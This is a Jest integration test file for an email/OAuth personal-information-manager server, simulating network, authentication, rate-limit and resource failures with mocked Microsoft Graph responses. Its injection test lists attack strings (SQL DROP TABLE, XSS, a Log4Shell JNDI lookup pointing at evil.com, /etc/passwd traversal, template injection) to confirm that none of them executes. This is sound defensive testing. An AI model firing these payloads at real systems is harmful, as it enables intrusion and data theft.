import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import { UnifiedPIMMain } from '../../src/index.js';
import { GraphApiMockStrategy, NetworkFailureSimulator } from '../mocks/advancedMockStrategies.js';
import { testConfig } from './setup.integration.js';
import nock from 'nock';

/**
 * Advanced Error Scenario Testing
 * 
 * Tests system behavior under various error conditions:
 * 1. Network failures and timeouts
 * 2. Authentication errors and token expiry
 * 3. API rate limiting and throttling
 * 4. Service unavailability and degradation
 * 5. Data corruption and validation errors
 * 6. Concurrent access conflicts
 * 7. Resource exhaustion scenarios
 * 8. Security breach simulations
 * 9. Dependency failures
 * 10. Recovery and fallback mechanisms
 */

interface ErrorScenario {
  name: string;
  description: string;
  setup: () => Promise<void>;
  execute: () => Promise<any>;
  verify: (result: any) => void;
  cleanup: () => Promise<void>;
}

describe('Advanced Error Scenario Testing', () => {
  let pimApp: UnifiedPIMMain;
  let graphMock: GraphApiMockStrategy;
  let networkSimulator: NetworkFailureSimulator;
  let mockServer: any;

  beforeAll(async () => {
    graphMock = new GraphApiMockStrategy({
      enableLogging: true,
      persistData: false,
      simulateRateLimit: false
    });

    networkSimulator = new NetworkFailureSimulator();
    
    pimApp = new UnifiedPIMMain();

    mockServer = {
      async callTool(name: string, args: any = {}): Promise<any> {
        try {
          const result = await pimApp['pimServer']?.executeTool(name, args);
          return result;
        } catch (error) {
          throw error;
        }
      }
    };
  });

  afterAll(async () => {
    await graphMock?.teardown();
    networkSimulator?.stop();
    
    if (pimApp) {
      process.emit('SIGTERM');
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  });

  beforeEach(async () => {
    await graphMock.setup();
    nock.cleanAll();
  });

  afterEach(async () => {
    networkSimulator.stop();
    nock.cleanAll();
  });

  describe('Network Failure Scenarios', () => {
    test('should handle complete network outage gracefully', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        // Setup authentication first
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'network-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'network-code', 
          state: 'network-state' 
        });

        // Simulate complete network failure
        console.log('🌐 Simulating complete network outage...');
        nock.cleanAll();
        nock.disableNetConnect();

        // Attempt operations during outage
        const result = await mockServer.callTool('pim_email_search', {
          query: 'network outage test',
          platform: 'microsoft'
        });

        expect(result.content[0].text).toContain('failed');

        // Restore network
        console.log('🔄 Restoring network connectivity...');
        nock.enableNetConnect();
        await graphMock.setup();

        // Verify recovery
        const recoveryResult = await mockServer.callTool('pim_auth_status', {
          platform: 'microsoft'
        });

        expect(recoveryResult.content[0].text).toBeDefined();

      } finally {
        nock.enableNetConnect();
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should handle intermittent network failures', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'intermittent-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'intermittent-code', 
          state: 'intermittent-state' 
        });

        console.log('📶 Simulating intermittent network failures...');

        // Setup intermittent failures
        let requestCount = 0;
        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(() => {
            requestCount++;
            if (requestCount % 3 === 0) {
              // Every 3rd request fails
              throw new Error('Network timeout');
            }
            return [200, { value: [] }];
          });

        // Perform multiple operations
        const operations = Array.from({ length: 10 }, (_, i) =>
          mockServer.callTool('pim_email_search', {
            query: `intermittent test ${i}`,
            platform: 'microsoft'
          }).catch(error => ({ error: error.message }))
        );

        const results = await Promise.allSettled(operations);
        
        // Some should succeed despite intermittent failures
        const successful = results.filter(r => r.status === 'fulfilled');
        const failed = results.filter(r => r.status === 'rejected');

        console.log(`📊 Intermittent failure results: ${successful.length} successful, ${failed.length} failed`);
        
        expect(successful.length).toBeGreaterThan(0);
        expect(failed.length).toBeGreaterThan(0);

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 60000);

    test('should handle DNS resolution failures', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'dns-test' });

        // Simulate DNS failure by mocking invalid host
        nock('https://invalid-graph-api.microsoft.com')
          .get('/v1.0/me/messages')
          .replyWithError({
            code: 'ENOTFOUND',
            errno: -3008,
            syscall: 'getaddrinfo',
            hostname: 'invalid-graph-api.microsoft.com'
          });

        const result = await mockServer.callTool('pim_email_search', {
          query: 'dns failure test',
          platform: 'microsoft'
        });

        expect(result.content[0].text).toContain('failed');

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);
  });

  describe('Authentication Error Scenarios', () => {
    test('should handle expired access tokens', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        // Setup initial authentication
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'token-expiry-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'token-code', 
          state: 'token-state' 
        });

        console.log('🔐 Simulating expired access token...');

        // Mock 401 Unauthorized response
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .reply(401, {
            error: {
              code: 'InvalidAuthenticationToken',
              message: 'Access token has expired or is malformed.'
            }
          });

        // Mock token refresh endpoint
        nock('https://login.microsoftonline.com')
          .post(/\/.*\/oauth2\/v2\.0\/token/)
          .reply(200, {
            access_token: 'new_access_token',
            token_type: 'Bearer',
            expires_in: 3600,
            refresh_token: 'new_refresh_token'
          });

        // Follow-up request should succeed with new token
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .reply(200, { value: [] });

        const result = await mockServer.callTool('pim_email_search', {
          query: 'token refresh test',
          platform: 'microsoft'
        });

        // Should eventually succeed after token refresh
        expect(result.content[0].text).toContain('Email search executed');

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should handle refresh token expiry', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'refresh-expiry-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'refresh-code', 
          state: 'refresh-state' 
        });

        console.log('🔐 Simulating refresh token expiry...');

        // Mock access token expiry
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .reply(401, {
            error: {
              code: 'InvalidAuthenticationToken',
              message: 'Access token has expired.'
            }
          });

        // Mock refresh token failure
        nock('https://login.microsoftonline.com')
          .post(/\/.*\/oauth2\/v2\.0\/token/)
          .reply(400, {
            error: 'invalid_grant',
            error_description: 'The provided authorization grant is invalid, expired, revoked, does not match the redirection URI used in the authorization request, or was issued to another client.'
          });

        const result = await mockServer.callTool('pim_email_search', {
          query: 'refresh token expired',
          platform: 'microsoft'
        });

        // Should indicate authentication is required
        expect(result.content[0].text).toContain('Not authenticated');

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should handle concurrent authentication attempts', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        console.log('🔐 Testing concurrent authentication attempts...');

        // Multiple concurrent auth starts
        const authPromises = Array.from({ length: 5 }, (_, i) =>
          mockServer.callTool('pim_auth_start', {
            platform: 'microsoft',
            userId: `concurrent-auth-${i}`
          }).catch(error => ({ error: error.message }))
        );

        const authResults = await Promise.allSettled(authPromises);

        // All should handle gracefully without conflicts
        const successful = authResults.filter(r => r.status === 'fulfilled');
        expect(successful.length).toBeGreaterThan(0);

        // Each should have unique state parameters
        const authUrls = successful
          .map(r => r.status === 'fulfilled' ? r.value : null)
          .filter(v => v && v.content && v.content[0])
          .map(v => v.content[0].text.match(/https:\/\/[^\s]+/)?.[0])
          .filter(url => url);

        const states = authUrls.map(url => {
          try {
            return new URL(url).searchParams.get('state');
          } catch {
            return null;
          }
        }).filter(state => state);

        const uniqueStates = new Set(states);
        expect(uniqueStates.size).toBe(states.length);

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);
  });

  describe('API Rate Limiting and Throttling', () => {
    test('should handle aggressive rate limiting', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'rate-limit-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'rate-code', 
          state: 'rate-state' 
        });

        console.log('🚦 Simulating aggressive rate limiting...');

        let requestCount = 0;
        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(() => {
            requestCount++;
            if (requestCount <= 5) {
              return [200, { value: [] }];
            } else {
              return [429, {
                error: {
                  code: 'TooManyRequests',
                  message: 'Rate limit exceeded'
                }
              }, {
                'Retry-After': '60'
              }];
            }
          });

        // Make many rapid requests
        const rapidRequests = Array.from({ length: 20 }, (_, i) =>
          mockServer.callTool('pim_email_search', {
            query: `rate limit test ${i}`,
            platform: 'microsoft'
          }).catch(error => ({ error: error.message }))
        );

        const results = await Promise.allSettled(rapidRequests);

        const successful = results.filter(r => r.status === 'fulfilled');
        const rateLimited = results.filter(r => 
          r.status === 'rejected' || 
          (r.status === 'fulfilled' && r.value.content?.[0]?.text?.includes('rate limit'))
        );

        console.log(`📊 Rate limiting results: ${successful.length} successful, ${rateLimited.length} rate limited`);

        expect(rateLimited.length).toBeGreaterThan(0);

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 60000);

    test('should handle exponential backoff correctly', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'backoff-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'backoff-code', 
          state: 'backoff-state' 
        });

        console.log('⏰ Testing exponential backoff behavior...');

        let attemptCount = 0;
        const attemptTimes: number[] = [];

        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(() => {
            attemptCount++;
            attemptTimes.push(Date.now());
            
            if (attemptCount <= 3) {
              return [429, {
                error: { code: 'TooManyRequests', message: 'Rate limit exceeded' }
              }, { 'Retry-After': '1' }];
            } else {
              return [200, { value: [] }];
            }
          });

        const startTime = Date.now();
        const result = await mockServer.callTool('pim_email_search', {
          query: 'backoff test',
          platform: 'microsoft'
        });
        const endTime = Date.now();

        // Should eventually succeed
        expect(result.content[0].text).toContain('Email search executed');

        // Should have taken some time due to backoff
        expect(endTime - startTime).toBeGreaterThan(1000);

        // Verify exponential backoff pattern
        if (attemptTimes.length > 1) {
          const intervals = [];
          for (let i = 1; i < attemptTimes.length; i++) {
            intervals.push(attemptTimes[i] - attemptTimes[i - 1]);
          }
          
          console.log(`⏰ Retry intervals: ${intervals.map(i => `${i}ms`).join(', ')}`);
          
          // Each interval should be larger than the previous (exponential backoff)
          for (let i = 1; i < intervals.length; i++) {
            expect(intervals[i]).toBeGreaterThanOrEqual(intervals[i - 1] * 0.8); // Allow some variance
          }
        }

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 60000);
  });

  describe('Service Degradation Scenarios', () => {
    test('should handle partial service outage', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'degradation-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'degradation-code', 
          state: 'degradation-state' 
        });

        console.log('⚠️ Simulating partial service degradation...');

        // Email service fails but auth still works
        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(503, {
            error: {
              code: 'ServiceUnavailable',
              message: 'The email service is temporarily unavailable'
            }
          });

        // Auth endpoints still work
        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me')
          .reply(200, {
            id: 'test-user',
            displayName: 'Test User',
            mail: 'test@example.com'
          });

        // Email operations should fail gracefully
        const emailResult = await mockServer.callTool('pim_email_search', {
          query: 'degradation test',
          platform: 'microsoft'
        });

        expect(emailResult.content[0].text).toContain('failed');

        // Auth operations should still work
        const authResult = await mockServer.callTool('pim_auth_status', {
          platform: 'microsoft'
        });

        expect(authResult.content[0].text).toBeDefined();

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should handle slow response times', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'slow-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'slow-code', 
          state: 'slow-state' 
        });

        console.log('🐌 Simulating slow response times...');

        // Mock very slow responses
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .delay(5000) // 5 second delay
          .reply(200, { value: [] });

        const startTime = Date.now();
        const result = await mockServer.callTool('pim_email_search', {
          query: 'slow response test',
          platform: 'microsoft'
        });
        const endTime = Date.now();

        const responseTime = endTime - startTime;
        console.log(`🐌 Response time: ${responseTime}ms`);

        // Should either succeed (if timeout is high enough) or fail gracefully
        expect(result.content[0].text).toBeDefined();

        if (result.content[0].text.includes('failed')) {
          // If it failed, it should be due to timeout
          expect(result.content[0].text).toContain('timeout');
        } else {
          // If it succeeded, it should have taken significant time
          expect(responseTime).toBeGreaterThan(4000);
        }

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);
  });

  describe('Data Corruption and Validation', () => {
    test('should handle malformed API responses', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'malformed-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'malformed-code', 
          state: 'malformed-state' 
        });

        console.log('📊 Testing malformed API response handling...');

        // Mock malformed JSON response
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .reply(200, '{"invalid": json, "malformed"');

        const result = await mockServer.callTool('pim_email_search', {
          query: 'malformed response test',
          platform: 'microsoft'
        });

        expect(result.content[0].text).toContain('failed');

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should handle missing required fields in API response', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'missing-fields-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'missing-code', 
          state: 'missing-state' 
        });

        console.log('📊 Testing missing required fields in API response...');

        // Mock response with missing required fields
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .reply(200, {
            // Missing 'value' field which is required
            '@odata.context': 'https://graph.microsoft.com/v1.0/$metadata#users/messages'
          });

        const result = await mockServer.callTool('pim_email_search', {
          query: 'missing fields test',
          platform: 'microsoft'
        });

        // Should handle gracefully
        expect(result.content[0].text).toBeDefined();

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should validate input parameters thoroughly', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'validation-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'validation-code', 
          state: 'validation-state' 
        });

        console.log('✅ Testing input parameter validation...');

        // Test various invalid inputs
        const invalidInputs = [
          { query: '', platform: 'microsoft' }, // Empty query
          { query: 'x'.repeat(1000), platform: 'microsoft' }, // Very long query
          { query: 'test', platform: 'invalid-platform' }, // Invalid platform
          { query: 'test', platform: 'microsoft', limit: -1 }, // Invalid limit
          { query: 'test', platform: 'microsoft', limit: 10000 }, // Excessive limit
          { query: null, platform: 'microsoft' }, // Null query
          { platform: 'microsoft' } // Missing query
        ];

        for (const input of invalidInputs) {
          const result = await mockServer.callTool('pim_email_search', input);
          
          // Should handle invalid input gracefully
          expect(result.content[0].text).toBeDefined();
          
          // Most invalid inputs should result in error messages
          if (input.query !== '' && input.platform === 'microsoft') {
            // Some validation might be handled at the API level
          }
        }

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);
  });

  describe('Resource Exhaustion Scenarios', () => {
    test('should handle memory pressure', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'memory-pressure-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'memory-code', 
          state: 'memory-state' 
        });

        console.log('🧠 Testing memory pressure handling...');

        const initialMemory = process.memoryUsage().heapUsed;

        // Generate large API responses to create memory pressure
        const largeResponse = {
          value: Array.from({ length: 1000 }, (_, i) => ({
            id: `large-email-${i}`,
            subject: `Large Subject ${i} `.repeat(100),
            body: {
              content: 'Large body content '.repeat(1000),
              contentType: 'text'
            },
            from: {
              emailAddress: {
                name: `Large Name ${i}`,
                address: `large-email-${i}@example.com`
              }
            }
          }))
        };

        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(200, largeResponse);

        // Perform multiple operations to create memory pressure
        const memoryIntensiveOps = Array.from({ length: 10 }, (_, i) =>
          mockServer.callTool('pim_email_search', {
            query: `memory pressure test ${i}`,
            platform: 'microsoft',
            limit: 100
          }).catch(error => ({ error: error.message }))
        );

        await Promise.allSettled(memoryIntensiveOps);

        const finalMemory = process.memoryUsage().heapUsed;
        const memoryIncrease = (finalMemory - initialMemory) / 1024 / 1024;

        console.log(`🧠 Memory increase: ${memoryIncrease.toFixed(2)}MB`);

        // System should handle memory pressure without crashing
        expect(memoryIncrease).toBeLessThan(500); // Less than 500MB increase

        // Force garbage collection if available
        if (global.gc) {
          global.gc();
          const gcMemory = process.memoryUsage().heapUsed;
          const gcReduction = (finalMemory - gcMemory) / 1024 / 1024;
          console.log(`🧠 Memory freed by GC: ${gcReduction.toFixed(2)}MB`);
        }

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 60000);

    test('should handle file descriptor exhaustion', async () => {
      console.log('📁 Testing file descriptor exhaustion handling...');
      
      // This is a simplified test - in a real scenario we would simulate
      // actual file descriptor exhaustion
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        // Simulate many concurrent connections
        const concurrentOps = Array.from({ length: 100 }, (_, i) =>
          mockServer.callTool('pim_auth_start', {
            platform: 'microsoft',
            userId: `fd-test-${i}`
          }).catch(error => ({ error: error.message }))
        );

        const results = await Promise.allSettled(concurrentOps);
        
        // System should handle many concurrent operations gracefully
        const successful = results.filter(r => r.status === 'fulfilled');
        expect(successful.length).toBeGreaterThan(50); // At least 50% should succeed

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 60000);
  });

  describe('Security Breach Simulations', () => {
    test('should handle token theft scenarios', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        console.log('🔒 Testing token theft scenario handling...');

        // Start authentication
        const authResult = await mockServer.callTool('pim_auth_start', {
          platform: 'microsoft',
          userId: 'security-test'
        });

        const authUrl = authResult.content[0].text.match(/https:\/\/[^\s]+/)[0];
        const state = new URL(authUrl).searchParams.get('state');

        // Complete authentication
        await mockServer.callTool('pim_auth_callback', {
          platform: 'microsoft',
          code: 'security-code',
          state: state
        });

        // Simulate token being used from different context/IP
        // (This would normally trigger security measures)
        nock('https://graph.microsoft.com')
          .get('/v1.0/me/messages')
          .query(true)
          .reply(401, {
            error: {
              code: 'InvalidAuthenticationToken',
              message: 'Token appears to be compromised'
            }
          });

        const result = await mockServer.callTool('pim_email_search', {
          query: 'security test',
          platform: 'microsoft'
        });

        // Should handle security error appropriately
        expect(result.content[0].text).toContain('Not authenticated');

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);

    test('should handle injection attack attempts', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'injection-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'injection-code', 
          state: 'injection-state' 
        });

        console.log('💉 Testing injection attack prevention...');

        // Test various injection attempts
        const injectionAttempts = [
          "'; DROP TABLE emails; --",
          '<script>alert("xss")</script>',
          '${jndi:ldap://evil.com/a}',
          '../../../etc/passwd',
          'null\x00byte',
          '{{7*7}}',
          '${7*7}',
          '#{7*7}'
        ];

        for (const injection of injectionAttempts) {
          const result = await mockServer.callTool('pim_email_search', {
            query: injection,
            platform: 'microsoft'
          });

          // Should handle injection attempts safely
          expect(result.content[0].text).toBeDefined();
          
          // Should not execute the injection
          expect(result.content[0].text).not.toContain('49'); // 7*7
          expect(result.content[0].text).not.toContain('alert');
          expect(result.content[0].text).not.toContain('DROP TABLE');
        }

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);
  });

  describe('Recovery and Fallback Mechanisms', () => {
    test('should recover from cascading failures', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        await mockServer.callTool('pim_auth_start', { platform: 'microsoft', userId: 'cascade-test' });
        await mockServer.callTool('pim_auth_callback', { 
          platform: 'microsoft', 
          code: 'cascade-code', 
          state: 'cascade-state' 
        });

        console.log('🏔️ Testing cascading failure recovery...');

        // Simulate multiple system failures
        let failurePhase = 1;

        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(() => {
            if (failurePhase === 1) {
              failurePhase++;
              return [503, { error: { code: 'ServiceUnavailable' } }];
            } else if (failurePhase === 2) {
              failurePhase++;
              return [429, { error: { code: 'TooManyRequests' } }];
            } else if (failurePhase === 3) {
              failurePhase++;
              return [500, { error: { code: 'InternalServerError' } }];
            } else {
              return [200, { value: [] }];
            }
          });

        // Attempt operation multiple times
        let finalResult;
        for (let attempt = 1; attempt <= 5; attempt++) {
          console.log(`   Attempt ${attempt}...`);
          
          finalResult = await mockServer.callTool('pim_email_search', {
            query: `cascade recovery test attempt ${attempt}`,
            platform: 'microsoft'
          });

          if (finalResult.content[0].text.includes('Email search executed')) {
            console.log(`   ✅ Recovered on attempt ${attempt}`);
            break;
          }

          // Wait between attempts
          await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Should eventually recover
        expect(finalResult.content[0].text).toContain('Email search executed');

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 60000);

    test('should implement graceful degradation', async () => {
      const appPromise = pimApp.main();
      await new Promise(resolve => setTimeout(resolve, 3000));

      try {
        console.log('⬇️ Testing graceful degradation...');

        // Mock email service failure but auth success
        nock('https://graph.microsoft.com')
          .persist()
          .get('/v1.0/me/messages')
          .query(true)
          .reply(503, {
            error: {
              code: 'ServiceUnavailable',
              message: 'Email service is down for maintenance'
            }
          });

        // Auth should still work
        const authResult = await mockServer.callTool('pim_auth_start', {
          platform: 'microsoft',
          userId: 'degradation-test'
        });

        expect(authResult.content[0].text).toContain('Authentication URL generated');

        // Email operations should fail gracefully with helpful message
        await mockServer.callTool('pim_auth_callback', {
          platform: 'microsoft',
          code: 'degradation-code',
          state: 'degradation-state'
        });

        const emailResult = await mockServer.callTool('pim_email_search', {
          query: 'degradation test',
          platform: 'microsoft'
        });

        expect(emailResult.content[0].text).toContain('failed');

        // System status should reflect partial functionality
        const statusResult = await mockServer.callTool('pim_auth_status', {
          platform: 'microsoft'
        });

        expect(statusResult.content[0].text).toBeDefined();

      } finally {
        process.emit('SIGTERM');
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }, 30000);
  });
});